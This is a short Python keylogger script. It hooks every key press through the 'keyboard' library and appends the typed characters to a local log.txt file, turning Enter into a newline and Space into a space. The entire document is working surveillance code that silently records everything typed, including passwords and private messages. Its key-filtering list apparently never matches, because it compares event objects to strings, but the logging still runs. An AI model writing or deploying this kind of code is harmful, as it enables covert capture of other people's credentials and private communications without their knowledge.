import keyboard


def when_press_the_key(key):
    keys_to_ignore = ['alt', 'delete', 'tab', 'back', 'esc', 'ctrl', 'shift', 'win', 'caps lock', 'up', 'down', 'left', 'right', 'insert', 'home', 'page up',
                      'page down', 'end', 'num lock', 'scroll lock', 'pause', 'print screen', 'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12']

    with open('log.txt', 'a', encoding='utf-8') as log_file:
        if key not in keys_to_ignore:
            if key.name == 'enter':
                log_file.write('\n')
            elif key.name == 'space':
                log_file.write(' ')
            else:
                log_file.write(key.name)


keyboard.on_press(when_press_the_key)
keyboard.wait()
